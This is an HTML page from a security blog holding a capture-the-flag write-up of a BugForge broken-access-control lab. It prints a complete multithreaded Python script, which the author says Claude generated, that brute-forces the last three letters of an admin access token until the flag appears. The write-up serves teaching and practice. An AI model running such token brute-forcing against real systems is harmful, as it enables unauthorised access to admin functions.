@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 64 64%27><rect width=%2764%27 height=%2764%27 rx=%2712%27 fill=%27%2306080f%27/><path d=%27M16 18L30 32L16 46%27 stroke=%27%2300d9ff%27 stroke-width=%276%27 fill=%27none%27 stroke-linecap=%27round%27 stroke-linejoin=%27round%27/><rect x=%2734%27 y=%2742%27 width=%2716%27 height=%276%27 rx=%272%27 fill=%27%2300ff9d%27/></svg>">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- EDIT: page title shown in browser tab -->
+    <title>Gift Lab (BAC) // 7s26simon</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../css/style.css">
+    <link rel="stylesheet" type="text/css" href="../css/style-writeup.css">
+</head>
+
+<body>
+
+    <!-- Imported from Medium: https://medium.com/@7s26simon/gift-lab-bac-bugforge-3fa17774119a -->
+
+    <header id="top-bar-blue">
+        <h1 id="name-font">Simon McCabe</h1>
+        <p class="certs">OSCP &middot; OSWP &middot; PWPP &middot; PWPA &middot; PAPA &middot; EnCE &middot; Linux+ &middot; LPIC-1 &middot; Network+ &middot; Security+ &middot; Pentest+ &middot; eJPT &middot; eWPT &middot; BSc &middot; PGCert</p>
+    </header>
+
+    <nav class="topnav">
+        <a href="../index.html">home</a>
+        <div class="topnav-dropdown active">
+            <a href="#" class="topnav-dropdown-toggle" aria-haspopup="true">writeups</a>
+            <div class="topnav-dropdown-menu" role="menu">
+                <a href="../hackthebox.html">hackthebox</a>
+                <a href="../tryhackme.html">tryhackme</a>
+                <a href="../vulnhub.html">vulnhub</a>
+                <a class="active" href="../bugforge.html">bugforge</a>
+                <a href="../webverse.html">webverse</a>
+            </div>
+        </div>
+        <a href="../general.html">blog</a>
+        <a href="../quicklinks.html">quick links</a>
+        <a href="../About.html">about</a>
+    </nav>
+
+    <!-- ===== Title block ===== -->
+    <div id="writeup-box-name">
+        <p>Gift Lab (BAC)</p>
+    </div>
+
+    <div id="marg-asthetic">
+
+<hr/><figure><img src="images/gift-lab-bac-3fa17774/1*G0M3HEBW2Vq9DKuzJBXrGw.png"/></figure><p>Step 1: Register and look at your token</p><figure><img src="images/gift-lab-bac-3fa17774/1*ZJXcg8qiQAM3itXpF2WCeg.png"/></figure><p>After registering, I saw that my token looked short, and perhaps even predictable. I registered a few more users and saw that the last 3 digits were the only thing that was changing. This looked promising.</p><figure><img src="images/gift-lab-bac-3fa17774/1*O7nwDwcqaAno2oh-Yce5Ow.png"/></figure><p>Step 2: Enumeration</p><p>After some enumeration, I landed on the /administrator URL, which pointed to the adminAccessToken. This confirmed my thoughts. We needed to craft an adminAccessToken to gain access to this part of the app.</p><figure><img src="images/gift-lab-bac-3fa17774/1*6RAQ76wf1uSdLUIugfau7A.png"/></figure><p>Step 3: Calculating the attack</p><p>At this point, I did some maths. 3 letters. 26 combinations per letter. That’s 26 ^ 3 which equals 17,576 possible combinations. Yeah, that seems easy enough to solve.</p><p>Step 4: Claude Scripting</p><p>I could have used burpsuite or caido, but I figured that it would be cool to have a brute-force script, so I fired up Claude and told it to create a script to generate the last 3 letters (lowercase) of my session token, and that upon success, it should see “bug{“ in the response. I told it that the script must contain my current cookies/tokens (minus 3 letters, which would be the ones we would brute force. And finally, I asked for multi-threading for speed. It came up with this:</p><p>Of course, if you use this: change your base_url, token_prefix and JWT to match your own.</p><pre class="code-view-two">import requests
+import itertools
+import string
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+BASE_URL = "https://lab-1773475898406-xfsd4c.labs-app.bugforge.io/administrator"
+TOKEN_PREFIX = "n0MqjBXna9A4" # token minus the last 3 letters
+CHARSET = string.ascii_lowercase
+
+JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJjb29sZ3V5IiwiaWF0IjoxNzczNDc3NjU1LCJleHAiOjE3NzM0ODQ4NTV9.Mjw__q7ZANNLy73uLEG2ubttcKUSKHlUKa0aFmv82bU"
+
+session = requests.Session()
+
+def try_token(suffix):
+    token = TOKEN_PREFIX + suffix
+    try:
+        r = session.get(
+            BASE_URL,
+            cookies={"token": JWT, "adminAccessToken": token},
+            allow_redirects=False,
+            timeout=5
+        )
+        if "bug{" in r.text:
+            return token, r.text
+    except requests.RequestException:
+        pass
+    return None
+
+def brute_force():
+    combos = [''.join(c) for c in itertools.product(CHARSET, repeat=3)]
+    print(f"[*] Trying {len(combos)} combinations with 50 threads...")
+
+    found = False
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(try_token, combo): combo for combo in combos}
+        for future in as_completed(futures):
+            result = future.result()
+            if result and not found:
+                found = True
+                token, body = result
+                print(f"
+[+] Found token: {token}")
+                print(body[:1000])
+                executor.shutdown(wait=False, cancel_futures=True)
+                return
+
+    if not found:
+        print("[-] No valid token found")
+
+brute_force()</pre><p>Step 5: Running the Script</p><p>I ran the script and it found the token after a minute or two:</p><figure><img src="images/gift-lab-bac-3fa17774/1*YGugYevEPxrFngq-UjKAHQ.png"/></figure><p>From here I could simply browse to the /administrator endpoint and grab the flag:</p><figure><img src="images/gift-lab-bac-3fa17774/1*bUWhTwnmd5Urmz-D4bsRXA.png"/></figure><p>Thanks for reading! And shoutout to __shadowforge__ for building this fun lab!</p>
+
+    </div>
+
+    <section id="social-media">
+        <a class="logoWidth" href="https://www.linkedin.com/in/simonmccabe1/" target="_blank" rel="noopener" aria-label="LinkedIn"><img src="../images/linkedin.PNG" alt="LinkedIn"></a>
+        <a class="logoWidth" href="https://x.com/7s26simon" target="_blank" rel="noopener" aria-label="X / Twitter"><img src="../images/twitter.PNG" alt="X"></a>
+        <a class="logoWidth" href="https://www.youtube.com/@7s26simon" target="_blank" rel="noopener" aria-label="YouTube"><img src="../images/youtube.PNG" alt="YouTube"></a>
+        <a class="logoWidth" href="https://github.com/7s26simon" target="_blank" rel="noopener" aria-label="GitHub"><img src="../images/linkedin.PNG" alt="GitHub"></a>
+    </section>
+
+    <footer id="bottom-bar">
+        <div id="validator">
+            <p id="footerTag">© 2026 Simon McCabe &middot; 7s26simon.github.io</p>
+        </div>
+    </footer>
+
+</body>
+</html>
